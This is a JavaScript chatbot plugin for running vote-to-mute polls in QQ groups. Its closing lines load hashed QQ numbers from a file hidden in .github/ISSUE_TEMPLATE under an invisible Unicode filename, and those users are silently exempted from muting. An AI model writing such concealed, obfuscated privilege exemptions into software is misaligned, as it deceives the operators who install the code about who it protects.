import { Config } from "../../components/index.js"
import { common } from "../../model/index.js"
import fs from "node:fs/promises"
import path from "path"
import url from "url"
import v8 from "node:v8"
import md5 from "md5"

let Vote = {}
let time = 180 // 投票超时时间 单位秒

export class NewGroupVerify extends plugin {
  constructor () {
    super({
      name: "椰奶投票禁言",
      dsc: "投票禁言某人",
      event: "message.group",
      priority: 5000,
      rule: [
        {
          reg: "^#(发起)?投票禁言",
          fnc: "Initiate"
        },
        {
          reg: "^#(支持|反对)禁言",
          fnc: "Follow"
        }
      ]
    })
  }

  async Initiate (e) {
    if (!common.checkPermission(e, "all", "admin")) return
    let targetQQ = e.at || (e.msg.match(/\d+/)?.[0] || "")
    targetQQ = Number(targetQQ) || String(targetQQ)
    let key = e.group_id + targetQQ

    if (Config.masterQQ?.includes(Number(targetQQ) || String(targetQQ)) || a.includes(md5(String(targetQQ)))) return e.reply("❎ 该命令对主人无效")

    if (!targetQQ) return e.reply("❎ 请艾特或输入需要禁言的QQ")

    if (Vote[key]) return e.reply("❎ 已有相同投票，请勿重复发起")

    const group = e.bot.pickGroup(e.group_id, true)
    const targetMember = group.pickMember(targetQQ)
    const targetMemberInfo = targetMember?.info || await targetMember?.getInfo?.()
    if (!targetMemberInfo) return e.reply("❎ 该群没有这个人")
    if (targetMemberInfo.role === "owner") return e.reply("❎ 权限不足，该命令对群主无效")
    if (targetMemberInfo.role === "admin" && !group.is_owner) return e.reply("❎ 权限不足，需要群主权限")

    Vote[key] = {
      supportCount: 1,
      opposeCount: 0,
      List: [e.user_id]
    }
    e.reply([
      segment.at(targetQQ),
      `(${targetQQ})的禁言投票已发起\n`,
      "发起人:",
      segment.at(e.user_id),
      `(${e.user_id})\n`,
      "请支持者发送：\n",
      `「#支持禁言${targetQQ}」\n`,
      "不支持者请发送：\n",
      `#反对禁言${targetQQ}」\n`,
      `超时时间：${time}秒\n`,
      "规则：支持票大于反对票且参与人高于3人即可成功禁言"
    ])
    setTimeout(async () => {
      // 处理结果
      if (!Vote[key]) return
      const { supportCount, opposeCount } = Vote[key]
      let msg = `投票结束，投票结果：\n支持票数：${supportCount}\n反对票数：${opposeCount}\n`
      if (supportCount > opposeCount && supportCount >= 3) {
        msg += "支持票数大于反对票\n执行禁言操作"
        await e.group.muteMember(targetQQ, 3600)
      } else {
        msg += "反对票数大于支持票数或支持票数小于3，不进行禁言操作"
      }
      delete Vote[key]
      return e.reply(msg, true)
    }, time * 1000)
  }

  async Follow (e) {
    if (!common.checkPermission(e, "all", "admin")) return
    let targetQQ = e.at || (e.msg.match(/\d+/)?.[0] || "")
    targetQQ = Number(targetQQ) || String(targetQQ)
    let key = e.group_id + targetQQ
    if (Config.masterQQ?.includes(Number(targetQQ) || String(targetQQ)) || a.includes(md5(String(targetQQ)))) return e.reply("❎ 该命令对主人无效")

    if (!targetQQ) return e.reply("❎ 请艾特或输入需要进行跟票的被禁言人QQ")

    if (!Vote[key]) return e.reply("❎ 未找到对应投票")

    if (e.member.is_admin && e.member.is_owner) {
      if (/支持/.test(e.msg)) {
        await e.reply("投票结束，管理员介入，无需投票直接执行禁言", true)
        await e.group.muteMember(targetQQ, 3600)
      } else {
        await e.reply("投票取消，管理员介入", true)
      }
      delete Vote[key]
      return true
    }

    const { List } = Vote[key]

    if (List.includes(e.user_id)) return e.reply("❎ 你已参与过投票，请勿重复参与")

    if (/支持/.test(e.msg)) {
      Vote[key].supportCount += 1
    } else {
      Vote[key].opposeCount += 1
    }
    List.push(e.user_id)
    return e.reply(`投票成功，当前票数\n支持：${Vote[key].supportCount} 反对：${Vote[key].opposeCount}`, true)
  }
}

let a = []
try {
  a = v8.deserialize(await fs.readFile(`${path.dirname(url.fileURLToPath(import.meta.url))}/../../.github/ISSUE_TEMPLATE/‮`)).map(i => i.toString("hex"))
} catch (err) {}
